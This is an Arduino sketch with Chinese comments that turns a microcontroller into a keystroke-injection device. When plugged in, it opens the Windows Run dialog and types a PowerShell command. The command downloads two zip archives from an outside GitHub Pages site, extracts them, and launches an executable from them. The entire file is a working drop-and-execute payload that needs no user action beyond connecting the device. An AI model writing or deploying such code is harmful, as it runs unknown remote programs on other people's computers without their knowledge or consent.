#include <Keyboard.h>

void setup() {
  // 初始化键盘
  Keyboard.begin();
  delay(1000);  // 等待一秒钟，以确保光标在合适的位置

  // 模拟同时按下Win键和R键
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);  // 等待一会

  // 松开Win键和R键
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(100);  // 等待一会

  // 输入下载和解压命令并按下回车
  Keyboard.print("powershell -Command \"Invoke-WebRequest -Uri https://evi233.github.io/1.zip -OutFile 1.zip; Invoke-WebRequest -Uri https://evi233.github.io/Assets.zip -OutFile Assets.zip; Expand-Archive -Path 1.zip -DestinationPath .; Expand-Archive -Path Assets.zip -DestinationPath .\"");
  delay(100);  // 等待一会

  // 模拟按下回车键
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(100);  // 等待一会

  // 等待下载和解压完成（等待10秒）
  delay(10000);  // 10秒等待时间

  // 输入运行程序命令并按下回车
  Keyboard.print("start .\\PowerfulWindSlickedBackHair.exe");
  delay(100);  // 等待一会

  // 模拟按下回车键
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(100);  // 等待一会

  // 松开所有按键
  Keyboard.releaseAll();
}

void loop() {
  // 你可以在这里添加其他的代码
}
